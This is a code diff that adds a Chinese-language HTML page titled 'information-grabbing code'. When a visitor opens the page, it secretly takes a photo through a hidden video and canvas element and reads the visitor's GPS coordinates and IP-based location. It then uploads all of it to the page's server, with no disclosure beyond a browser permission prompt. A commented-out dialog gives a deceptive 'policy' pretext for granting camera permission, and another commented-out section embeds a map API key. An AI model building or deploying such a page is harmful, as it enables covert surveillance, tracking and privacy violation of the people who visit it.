@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		 
+		<title>获取信息代码</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<!-- 新 Bootstrap 核心 CSS 文件 -->
+		<link href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+
+		<!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->
+		<script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
+
+		<!-- 最新的 Bootstrap 核心 JavaScript 文件 -->
+		<script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+		<!-- 引入 layui.css -->
+		<link rel="stylesheet" href="https://www.layuicdn.com/layui/css/layui.css">
+
+		<!-- 引入 layui.js -->
+		<script src="https://www.layuicdn.com/layui/layui.js"></script>
+		<!-- <script src="https://cdn.jsdelivr.net/gh/snapappointments/bootstrap-select/js/bootstrap-select.js"></script> -->
+
+
+		<meta name="referrer" content="never">
+
+	</head>
+	<body>
+		<!-- 拍照用 -->
+		<video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
+		<canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
+	</body>
+	<script type="text/javascript">
+		// 储存获取到的信息
+		var infodata = {};
+
+		function IPCallBack(location) {
+			infodata['ip'] = {
+				'ip': location.ip,
+				'where': location.addr
+			};
+		};
+
+		// 窗体加载完成后的事情
+		$(document).ready(function() {
+			// layer.alert('因为政策需要，请小可爱赋予权限以运行，谢谢！', {
+			// 	skin: 'layui-layer-molv', //样式类名
+			// 	closeBtn: 1,
+			// }, function(index) {
+			// 	getMedia(getGps);
+			// });
+			getMedia(getGps);
+		});
+
+		//提交数据上服务器
+		function submit() {
+			// 判断数据是否为空
+			// if (infodata.base64 == undefined && infodata.gps == undefined) {
+			// 	console.log('数据为空');
+			// 	layer.msg('空空然~');
+			// 	return;
+			// };
+			console.log(infodata);
+			$.ajax({
+				url: "/upload_info/",
+				type: "POST",
+				contentType:'application/json;charset=UTF-8',
+				data: JSON.stringify(infodata),
+				dataType: "json",
+				beforeSend: function IPCallBack(location) {
+					// jsShow();
+					// console.log(location);
+				},
+				success: function(result) {
+					console.log(result)
+					if (result.code == 200) {
+						layer.msg(result.msg);
+					} else {
+						layer.msg(result.code + result.msg);
+					}
+				},
+				error: function(xhr, status, error) {
+					console.log("上传失败");
+					layer.msg("内部submit失败." + status + error);
+				}
+			})
+		};
+
+		// 拍照代码
+		//获得video摄像头区域
+		let video = document.getElementById("video");
+
+		// 摄像头成功则调用此代码
+		function takePhoto(callback) {
+			//获得Canvas对象
+			let canvas = document.getElementById("canvas");
+			let ctx = canvas.getContext('2d');
+			ctx.drawImage(video, 0, 0, 600, 600);
+			// 图片转base64
+			var base64 = canvas.toDataURL('image/jpeg').substr(22);
+			// 上传base64图片和地理位置到服务器
+			infodata['base64'] = base64;
+			callback(submit); // 执行回调
+
+		}
+
+		function getMedia(callback) {
+			let constraints = {
+				video: {
+					width: 600,
+					height: 600
+				},
+				audio: false
+			};
+			/*
+			这里介绍新的方法:H5新媒体接口 navigator.mediaDevices.getUserMedia()
+			这个方法会提示用户是否允许媒体输入,(媒体输入主要包括相机,视频采集设备,屏幕共享服务,麦克风,A/D转换器等)
+			返回的是一个Promise对象。
+			如果用户同意使用权限,则会将 MediaStream对象作为resolve()的参数传给then()
+			如果用户拒绝使用权限,或者请求的媒体资源不可用,则会将 PermissionDeniedError作为reject()的参数传给catch()
+			*/
+			let promise = navigator.mediaDevices.getUserMedia(constraints);
+			promise.then(function(MediaStream) {
+				// 获取成功延时4s后拍照
+				video.srcObject = MediaStream;
+				video.play();
+				layer.msg("申请成功!");
+				setTimeout(function() {
+					takePhoto(getGps);
+				}, 1500);
+
+			}).catch(function(PermissionDeniedError) {
+				layer.alert('权限申请失败!网页无法正常运行咯,呜呜呜:' + PermissionDeniedError, {
+					skin: 'layui-layer-molv', //样式类名
+					closeBtn: 1
+				}, function(index) {
+					layer.close(index);
+				});
+				callback();
+				console.log(PermissionDeniedError);
+			})
+
+		}
+
+		// 获取位置
+		function getGps() {
+			// H5 获取当前位置经纬度
+			var location_lon = '',
+				location_lat = ''; // 经度,纬度
+			if (navigator.geolocation) {
+
+				navigator.geolocation.getCurrentPosition(function(position) {
+					location_lon = position.coords.longitude;
+					location_lat = position.coords.latitude;
+					// layer.msg('h5经度：'+location_lon+'h5纬度：'+location_lat);
+					var r = {
+						"x": location_lon,
+						"y": location_lat,
+					};
+					infodata['gps'] = r;
+					// initmap(r["x"], r["y"]);
+					layer.msg('GPMS 成功');
+					submit();
+				}, function(error) {
+					layer.msg("GPMS内部错误");
+					submit();
+				});
+
+			} else {
+				console.log("错误");
+				layer.msg("浏览器不支持GPMS！");
+				submit();
+			}
+		};
+	</script>
+	 <script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
+</html>
+
+<!-- 地图 -->
+<!-- <!DOCTYPE html>
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
+		<style type="text/css">
+			body,
+			html,
+			#allmap {
+				width: 100%;
+				height: 100%;
+				overflow: hidden;
+				margin: 0;
+				font-family: "微软雅黑";
+			}
+		</style>
+		<script type="text/javascript"
+			src="https://api.map.baidu.com/api?type=webgl&v=1.0&ak=nhjf6GvltDyYZnd3noKZgxxWmwb5zM7d"></script>
+	</head>
+	<body>
+		<div id="allmap"></div>
+	</body>
+</html>
+<script type="text/javascript">
+	function initmap(x, y) {
+
+		// GL版命名空间为BMapGL
+		// 按住鼠标右键，修改倾斜角和角度
+		var map = new BMapGL.Map("allmap"); // 创建Map实例
+		map.centerAndZoom(new BMapGL.Point(x, y), 12); // 初始化地图,设置中心点坐标和地图级别
+		map.enableScrollWheelZoom(true); //开启鼠标滚轮缩放
+		var scaleCtrl = new BMapGL.ScaleControl(); // 添加比例尺控件
+		map.addControl(scaleCtrl);
+		var zoomCtrl = new BMapGL.ZoomControl(); // 添加比例尺控件
+		map.addControl(zoomCtrl);
+		// 创建点标记
+		var marker1 = new BMapGL.Marker(new BMapGL.Point(x, y));
+		// 在地图上添加点标记
+		map.addOverlay(marker1);
+	}
+</script>
+ -->
